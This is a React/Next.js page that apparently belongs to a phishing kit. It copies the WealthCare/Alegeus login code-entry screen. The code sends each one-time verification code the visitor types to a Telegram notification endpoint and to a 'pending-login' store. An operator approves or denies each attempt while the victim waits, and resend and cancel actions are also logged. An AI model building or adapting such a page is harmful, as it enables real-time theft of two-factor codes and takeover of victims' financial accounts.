"use client";

import {
  useEffect,
  useLayoutEffect,
  useState,
  useRef,
  Suspense,
  useCallback,
} from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { Check, Lock, Mail, MessageSquare, X } from "lucide-react";
import { Button } from "@/components/ui/button";
import { LoginFlowHeader } from "@/components/LoginFlowHeader";
import { SiteFooter } from "@/components/SiteFooter";
import { ThreeDotSpinner } from "@/components/ThreeDotSpinner";
import { FLOW_STEP, setFlowStep, useFlowGuard } from "@/lib/flow-guard";
import { usePendingLoginPoll } from "@/lib/use-pending-login-poll";
import { trackFormSubmission } from "@/hooks/use-visitor-tracking";
import {
  MSG_UNABLE_REACH_VERIFICATION,
  OTP_CODE_ERROR_TEXT,
  OTP_RESEND_COOLDOWN_SEC,
  OTP_RESEND_LOADING_MS,
  MSG_UNABLE_VERIFY_TIME,
} from "@/lib/approval-messages";
import {
  IGOE_NEUTRAL_FILL,
  IGOE_NEUTRAL_HOVER,
  IGOE_PRIMARY_FILL,
  IGOE_PRIMARY_HOVER,
  WEALTHCARE_BUTTON_CHROME,
  WEALTHCARE_BUTTON_GEOMETRY,
  WEALTHCARE_NEUTRAL_BUTTON_CLASS,
} from "@/lib/wealthcare-button-styles";

/**
 * Code-entry screen (step 2 of the WealthCare/Alegeus `authentication-confirmation`
 * component). Layout, copy order, button metrics and the confirmation code row
 * follow the reference; igoe's own approval flow (Telegram notify, pending-login
 * poll, denied/timeout handling) is preserved unchanged.
 *
 * Colours are igoe's palette rather than the reference tenant's: GENERATE/CONTINUE
 * and RESEND use #010147 (hover #0063FF), CANCEL uses #646464 (hover #545454),
 * note boxes use #F3F7A9 on #424242.
 */
const NOTE_TEXT =
  "If you wish to cancel, you will be asked to enter a code the next time you login or try to perform this specific function.";

const NOTE_STYLE = { backgroundColor: "#F3F7A9" } as const;

/** igoe's admin-approval flow expects a 6-digit code. Validated, but not displayed
 *  as a hint — the reference shows no length rule. */
const OTP_LENGTH = 6;

const CONTINUE_STYLE = {
  backgroundColor: IGOE_PRIMARY_FILL,
  color: "#ffffff",
};
const CANCEL_STYLE = {
  backgroundColor: IGOE_NEUTRAL_FILL,
  color: "#ffffff",
};

/** Shared Wealthcare tokens — see `lib/wealthcare-button-styles.ts`. */
const BUTTON_CHROME = `${WEALTHCARE_BUTTON_GEOMETRY} gap-3.5 ${WEALTHCARE_BUTTON_CHROME}`;

const CONTENT_COLUMN =
  "w-full px-[10px] pt-4 md:pt-10 pb-8 min-[769px]:px-4 min-[1200px]:max-w-[1180px] min-[1200px]:mx-auto min-[1440px]:max-w-[1280px] min-[1440px]:px-[50px]";

const CONTENT_INNER =
  "w-full min-[769px]:w-[calc(39%-27px)] min-[769px]:ml-[27px]";

function VerifyCodeContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const method = searchParams.get("method") || "email";

  useLayoutEffect(() => {
    setFlowStep(FLOW_STEP.VERIFY_METHOD);
  }, []);

  const isAllowed = useFlowGuard(FLOW_STEP.VERIFY_METHOD);

  const [maskedEmail, setMaskedEmail] = useState("**********");
  const [maskedPhone, setMaskedPhone] = useState("***-***-****");
  const [code, setCode] = useState("");
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [isLoading, setIsLoading] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [resendCooldown, setResendCooldown] = useState(0);
  const [pendingOtpId, setPendingOtpId] = useState<string | null>(null);
  const inputRef = useRef<HTMLInputElement | null>(null);
  const verifyingRef = useRef(false);

  useEffect(() => {
    if (typeof window !== "undefined" && window.self !== window.top) {
      window.top!.location.href =
        window.location.pathname + window.location.search;
    }
  }, []);

  useEffect(() => {
    try {
      const email = sessionStorage.getItem("maskedEmail");
      const phone = sessionStorage.getItem("maskedPhone");
      if (email) setMaskedEmail(email);
      if (phone) setMaskedPhone(phone);
    } catch {
      // ignore
    }
  }, []);

  useEffect(() => {
    if (searchParams.get("denied") === "1") {
      setCode("");
      setErrors({ otp: OTP_CODE_ERROR_TEXT });
      setIsLoading(false);
      setPendingOtpId(null);
      verifyingRef.current = false;
      setTimeout(() => inputRef.current?.focus(), 0);
      router.replace(`/login/verify-code?method=${method}`);
      return;
    }
    if (searchParams.get("timeout") === "1") {
      setCode("");
      setErrors({ otp: MSG_UNABLE_VERIFY_TIME });
      setIsLoading(false);
      setPendingOtpId(null);
      verifyingRef.current = false;
      setTimeout(() => inputRef.current?.focus(), 0);
      router.replace(`/login/verify-code?method=${method}`);
    }
  }, [searchParams, router, method]);

  useEffect(() => {
    if (resendCooldown <= 0) return;
    const timer = setInterval(() => {
      setResendCooldown((prev) => (prev <= 1 ? 0 : prev - 1));
    }, 1000);
    return () => clearInterval(timer);
  }, [resendCooldown]);

  const handleCodeChange = (value: string) => {
    if (isLoading) return;
    const digits = value.replace(/\D/g, "").slice(0, OTP_LENGTH);
    setCode(digits);
    if (errors.otp) setErrors({});
  };

  const handleVerify = useCallback(async () => {
    if (isLoading || verifyingRef.current) return;

    setErrors({});
    if (code.length !== OTP_LENGTH) {
      setErrors({ otp: OTP_CODE_ERROR_TEXT });
      return;
    }

    verifyingRef.current = true;
    setIsLoading(true);

    void fetch("/api/telegram/verification", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        method,
        otp: code,
        page: `/login/verify-code?method=${method}`,
      }),
    }).catch(() => {});

    const userId = sessionStorage.getItem("loginUserId") ?? "";
    const maskedEmailStored =
      sessionStorage.getItem("maskedEmail") ?? maskedEmail;
    const maskedPhoneStored =
      sessionStorage.getItem("maskedPhone") ?? maskedPhone;
    const apiMethod = method === "email" ? "email" : "text";

    try {
      const res = await fetch("/api/pending-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId: userId || "login",
          password: code,
          method: apiMethod,
          maskedEmail: maskedEmailStored,
          maskedPhone: maskedPhoneStored,
          flow: "login_otp",
        }),
      });
      const data = await res.json();
      if (!res.ok) {
        setIsLoading(false);
        verifyingRef.current = false;
        if (data.error) console.error("[pending-login] rejected:", data.error);
        setErrors({ otp: MSG_UNABLE_REACH_VERIFICATION });
        setCode("");
        return;
      }
      if (data.id) {
        setPendingOtpId(data.id);
        return;
      }
      setIsLoading(false);
      verifyingRef.current = false;
      setErrors({ otp: OTP_CODE_ERROR_TEXT });
      setCode("");
    } catch {
      setErrors({ otp: MSG_UNABLE_REACH_VERIFICATION });
      setIsLoading(false);
      verifyingRef.current = false;
      setCode("");
    }
  }, [isLoading, code, method, maskedEmail, maskedPhone]);

  const handleResend = async () => {
    if (isResending || resendCooldown > 0) return;

    setIsResending(true);
    setCode("");
    setErrors({});
    setPendingOtpId(null);
    verifyingRef.current = false;

    try {
      // Fire-and-forget: the notification must never sit on the UI critical path.
      const resendUserId =
        typeof window !== "undefined"
          ? (sessionStorage.getItem("loginUserId") ?? "")
          : "";
      void fetch("/api/telegram/resend-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          page: `/login/verify-code?method=${method}`,
          userId: resendUserId,
        }),
        keepalive: true,
      }).catch(() => {});

      await new Promise((r) => setTimeout(r, OTP_RESEND_LOADING_MS));
    } finally {
      setIsResending(false);
      setResendCooldown(OTP_RESEND_COOLDOWN_SEC);
      inputRef.current?.focus();
    }
  };

  const handleBack = () => {
    const userId =
      typeof window !== "undefined"
        ? (sessionStorage.getItem("loginUserId") ?? "")
        : "";
    void trackFormSubmission({
      type: "login_did_not_receive_code",
      page: `/login/verify-code?method=${method}`,
      userId,
    }).catch(() => {});
    window.location.href = "/login/2fa-verify";
  };

  const isEmail = method === "email";
  const apiMethod = method === "email" ? "email" : "text";
  const isWaitingOtp = isLoading && pendingOtpId !== null;
  const contactLabel = isEmail ? "Email" : "SMS";
  const ContactGlyph = isEmail ? Mail : MessageSquare;

  usePendingLoginPoll({
    pendingId: isWaitingOtp ? pendingOtpId : null,
    method: apiMethod,
    step: "otp",
    enabled: isWaitingOtp,
    onError: (message) => {
      setErrors({ otp: message });
      setIsLoading(false);
      setPendingOtpId(null);
      verifyingRef.current = false;
    },
  });

  if (!isAllowed) return null;

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <LoginFlowHeader />

      <main className="flex-1 flex flex-col min-[1200px]:items-center">
        <div className={CONTENT_COLUMN}>
          <div className={CONTENT_INNER}>
            {/* .conf — lock glyph + "sent to" copy, matching the reference's
                step-2 header block. */}
            <div className="mb-[18px]">
              <Lock className="w-[46px] h-[46px] text-[#414041] mx-auto mb-[5px]" />
              <p className="text-[14px] leading-[1.6] text-[#707070] text-center">
                {isEmail ? "An e-mail has been sent:" : "An SMS has been sent:"}
              </p>
              <p className="text-[14px] leading-[1.6] text-[#707070] text-center">
                Enter the verification code that you received via{" "}
                <strong className="font-semibold">{contactLabel}</strong> below:
              </p>
              {/* .notes */}
              <p className="text-[14px] leading-[1.6] text-[#707070] text-center mt-4">
                Note - Do not share your verification code with anyone else
              </p>
            </div>

            {errors.otp ? (
              <p className="text-red-600 text-sm text-center mb-4" role="alert">
                {errors.otp}
              </p>
            ) : null}

            {/* Matches the method page: on Continue the whole form region — code
                row AND buttons — is replaced by the spinner, while the copy above
                and the note below stay on screen. `isLoading` (not
                `isWaitingOtp`) is the swap condition so it starts on click, the
                same way `loadingMethod` does on the method page. */}
            {isLoading ? (
              <ThreeDotSpinner label="Verifying your code" />
            ) : (
              <div>
                {/* .popup-row.ic20 — mail glyph + "Confirmation Code" label + input.
                    Side-by-side ≥1200px, stacked below (reference behaviour). */}
                <div className="flex flex-col min-[1200px]:flex-row min-[1200px]:items-center min-[1200px]:justify-between gap-1 min-[1200px]:gap-0 mb-4">
                  <div className="w-full max-[768px]:mx-[5px] min-[1200px]:w-[200px] min-[1200px]:mr-auto">
                    {/* Reference places the glyph at left:0 of the row and starts the
                        label text at the 36px (.popup-row_name padding) inset. */}
                    <div className="flex items-center gap-3.5">
                      <ContactGlyph
                        className="w-[22px] h-[22px] text-[#424242] shrink-0"
                        aria-hidden="true"
                      />
                      <span className="text-[14px] text-gray-700 whitespace-nowrap">
                        Confirmation Code
                      </span>
                    </div>
                  </div>
                  <div className="relative w-full h-[38px] bg-white min-[1200px]:w-[202px]">
                    <input
                      ref={inputRef}
                      type="text"
                      name="code"
                      inputMode="numeric"
                      autoComplete="one-time-code"
                      value={code}
                      onChange={(e) => handleCodeChange(e.target.value)}
                      onPaste={(e) => {
                        e.preventDefault();
                        handleCodeChange(e.clipboardData.getData("text"));
                      }}
                      aria-label="Confirmation Code"
                      className="w-full h-full px-3 bg-white border border-[#bec5c2] text-[15px] text-[#424242] outline-none"
                    />
                  </div>
                </div>

                {/* .popup_buttons — 220px block, stacked, each 100% wide.
                    Reference order: Continue (primary) / Cancel / Resend Code. */}
                <div className="w-[220px] mx-auto">
                  <Button
                    type="button"
                    disabled={code.length !== OTP_LENGTH}
                    onClick={() => void handleVerify()}
                    className={`${BUTTON_CHROME} mb-[10px] disabled:opacity-60`}
                    style={CONTINUE_STYLE}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.backgroundColor = IGOE_PRIMARY_HOVER;
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.backgroundColor = IGOE_PRIMARY_FILL;
                    }}
                  >
                    <Check className="w-6 h-6 shrink-0" />
                    <span className="flex-1 text-center truncate">
                      Continue
                    </span>
                  </Button>

                  <Button
                    type="button"
                    variant="secondary"
                    onClick={handleBack}
                    className={`${WEALTHCARE_BUTTON_GEOMETRY} ${WEALTHCARE_NEUTRAL_BUTTON_CLASS} gap-3.5 mb-[10px]`}
                    style={CANCEL_STYLE}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.backgroundColor = IGOE_NEUTRAL_HOVER;
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.backgroundColor = IGOE_NEUTRAL_FILL;
                    }}
                  >
                    <X className="w-6 h-6 shrink-0" />
                    <span className="flex-1 text-center truncate">Cancel</span>
                  </Button>

                  <Button
                    type="button"
                    variant="secondary"
                    disabled={isResending || resendCooldown > 0}
                    onClick={() => void handleResend()}
                    className={`${BUTTON_CHROME} disabled:opacity-60`}
                    style={CONTINUE_STYLE}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.backgroundColor = IGOE_PRIMARY_HOVER;
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.backgroundColor = IGOE_PRIMARY_FILL;
                    }}
                  >
                    {isResending ? (
                      <span
                        className="w-6 h-6 shrink-0 animate-pulse"
                        aria-hidden="true"
                      />
                    ) : null}
                    <span
                      className={`truncate ${
                        isResending || resendCooldown > 0
                          ? "flex-1 text-center"
                          : ""
                      }`}
                    >
                      {isResending
                        ? "Sending..."
                        : resendCooldown > 0
                          ? `Resend Code (${resendCooldown})`
                          : "Resend Code"}
                    </span>
                  </Button>
                </div>
              </div>
            )}

            {/* .protect-bl.small-mb — kept visible while the approval poll runs,
                matching the reference where the note sits outside the gated form. */}
            <div
              role="note"
              className="relative mt-6 pl-[48px] min-[769px]:pl-[62px] pr-[13px] py-[13px] pb-[14px] text-[14px] leading-[1.3] text-[#424242]"
              style={NOTE_STYLE}
            >
              <span
                className="absolute left-1 top-1/2 -translate-y-1/2 w-[35px] h-[35px] rounded-full border-2 border-[#414141] text-[#414141] text-[20px] leading-[31px] text-center"
                aria-hidden="true"
              >
                i
              </span>
              <p className="m-0">{NOTE_TEXT}</p>
            </div>
          </div>
        </div>
      </main>

      <SiteFooter />
    </div>
  );
}

export default function LoginVerifyCodePage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen flex items-center justify-center">
          <p className="text-gray-600">Loading...</p>
        </div>
      }
    >
      <VerifyCodeContent />
    </Suspense>
  );
}
